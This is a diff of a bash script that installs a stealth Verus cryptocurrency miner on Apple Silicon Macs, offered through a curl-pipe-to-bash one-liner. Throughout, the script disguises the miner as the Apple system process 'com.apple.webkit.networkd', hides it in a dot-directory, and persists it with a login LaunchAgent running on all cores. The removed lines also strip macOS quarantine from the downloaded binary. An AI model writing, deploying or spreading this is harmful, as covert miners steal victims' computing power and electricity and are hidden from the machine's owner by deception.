@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 # ============================================================
-# mine.sh — Silent Verus (VRSC) CPU miner for macOS ARM
-# Works on M1 / M2 / M3 / M4 — any Apple Silicon
+# mine.sh — Silent Verus (VRSC) miner for macOS Apple Silicon
+# Builds ccminer natively from source (M1/M2/M3/M4 compatible)
 # Process appears as: "com.apple.webkit.networkd"
 # Run: curl -fsSL https://raw.githubusercontent.com/sajalsoumalya/vps/main/mine.sh | bash
 # ============================================================
@@ -12,48 +12,72 @@ POOL_HOST="na.luckpool.net"
 POOL_PORT="3956"
 THREADS=$(sysctl -n hw.logicalcpu)
 
-# ---- disguise paths ----
+# ---- disguise ----
 DISGUISE_NAME="com.apple.webkit.networkd"
 INSTALL_DIR="$HOME/Library/Application Support/.wknd"
 BINARY_PATH="$INSTALL_DIR/$DISGUISE_NAME"
 PLIST_PATH="$HOME/Library/LaunchAgents/${DISGUISE_NAME}.plist"
 LOG_PATH="$HOME/Library/Logs/${DISGUISE_NAME}.log"
+BUILD_DIR="$INSTALL_DIR/.build"
 
-# ---- sanity: must be macOS arm64 ----
-if [[ "$(uname)" != "Darwin" ]]; then
-  echo "[!] This script is for macOS only."
+mkdir -p "$INSTALL_DIR" "$HOME/Library/LaunchAgents" "$HOME/Library/Logs"
+
+if [[ "$(uname)" != "Darwin" || "$(uname -m)" != "arm64" ]]; then
+  echo "[!] This script requires macOS Apple Silicon (M1/M2/M3/M4)."
   exit 1
 fi
 
-ARCH=$(uname -m)
+echo "[*] Apple Silicon detected — ${THREADS} cores"
 
-echo "[*] Setting up on macOS ${ARCH} — ${THREADS} threads"
-mkdir -p "$INSTALL_DIR"
-mkdir -p "$HOME/Library/LaunchAgents"
-mkdir -p "$HOME/Library/Logs"
+# ---- stop old instance ----
+launchctl unload "$PLIST_PATH" 2>/dev/null || true
 
-# ---- download miner binary ----
+# ---- build from source if binary missing ----
 if [[ ! -f "$BINARY_PATH" ]]; then
-  if [[ "$ARCH" == "arm64" ]]; then
-    DL="https://github.com/Oink70/ccminer-verus/releases/download/v3.8.3c-CPU-only/ccminer-v3.8.3c-oink_ARM"
+  echo "[*] Binary not found — building ccminer from source..."
+
+  # 1. Install build deps via Homebrew
+  if ! command -v brew &>/dev/null; then
+    echo "[*] Installing Homebrew..."
+    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" </dev/null
+    eval "$(/opt/homebrew/bin/brew shellenv)"
   else
-    DL="https://github.com/Oink70/ccminer-verus/releases/download/v3.8.3c-CPU-only/ccminer-v3.8.3c-oink_x86-64"
+    eval "$(/opt/homebrew/bin/brew shellenv)"
   fi
-  echo "[*] Downloading miner..."
-  curl -fsSL "$DL" -o "$BINARY_PATH"
-  chmod +x "$BINARY_PATH"
-  # strip quarantine so macOS doesn't block it
-  xattr -d com.apple.quarantine "$BINARY_PATH" 2>/dev/null || true
-  echo "[*] Binary ready."
+
+  echo "[*] Installing build tools (cmake, boost, openssl)..."
+  brew install cmake boost openssl 2>/dev/null
+
+  # 2. Clone monkins1010/ccminer (best maintained verus fork)
+  rm -rf "$BUILD_DIR"
+  git clone --depth 1 https://github.com/monkins1010/ccminer "$BUILD_DIR"
+
+  # 3. Build
+  cd "$BUILD_DIR"
+  mkdir -p build && cd build
+
+  cmake .. \
+    -DBOOST_ROOT="$(brew --prefix boost)" \
+    -DOPENSSL_ROOT_DIR="$(brew --prefix openssl)" \
+    -DCUDA_ENABLED=OFF \
+    -DCMAKE_BUILD_TYPE=Release 2>&1 | tail -5
+
+  make -j"$THREADS" 2>&1 | tail -10
+
+  # 4. Copy binary with disguised name
+  if [[ -f "$BUILD_DIR/build/ccminer" ]]; then
+    cp "$BUILD_DIR/build/ccminer" "$BINARY_PATH"
+    chmod +x "$BINARY_PATH"
+    echo "[+] Build successful."
+  else
+    echo "[!] Build failed — check brew deps."
+    exit 1
+  fi
 else
-  echo "[*] Binary already installed — skipping download."
+  echo "[*] Binary already exists — skipping build."
 fi
 
-# ---- stop old instance if running ----
-launchctl unload "$PLIST_PATH" 2>/dev/null || true
-sleep 1
-
-# ---- write launchd plist (auto-start on login) ----
+# ---- write launchd plist ----
 cat > "$PLIST_PATH" <<PLIST
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
@@ -75,24 +99,27 @@ cat > "$PLIST_PATH" <<PLIST
   <key>StandardOutPath</key>   <string>${LOG_PATH}</string>
   <key>StandardErrorPath</key> <string>${LOG_PATH}</string>
   <key>ProcessType</key>       <string>Background</string>
-  <key>Nice</key>              <integer>10</integer>
+  <key>Nice</key>              <integer>5</integer>
 </dict>
 </plist>
 PLIST
 
-# ---- launch it ----
+# ---- launch ----
 launchctl load -w "$PLIST_PATH"
+sleep 2
 
 echo ""
 echo "=========================================="
-echo " Miner running silently in background"
+echo " Miner running in background"
 echo " Process : $DISGUISE_NAME"
 echo " Wallet  : $WALLET"
 echo " Pool    : $POOL_HOST:$POOL_PORT"
-echo " Threads : $THREADS"
+echo " Threads : $THREADS (all cores)"
 echo " Log     : $LOG_PATH"
 echo "=========================================="
 echo ""
-echo "  Check : launchctl list | grep webkit.networkd"
-echo "  Logs  : tail -f \"$LOG_PATH\""
-echo "  Stop  : launchctl unload \"$PLIST_PATH\""
+echo "  Live logs : tail -f \"$LOG_PATH\""
+echo "  Status    : launchctl list | grep webkit.networkd"
+echo "  Stop      : launchctl unload \"$PLIST_PATH\""
+echo ""
+tail -20 "$LOG_PATH" 2>/dev/null || echo "[*] Log will appear shortly..."
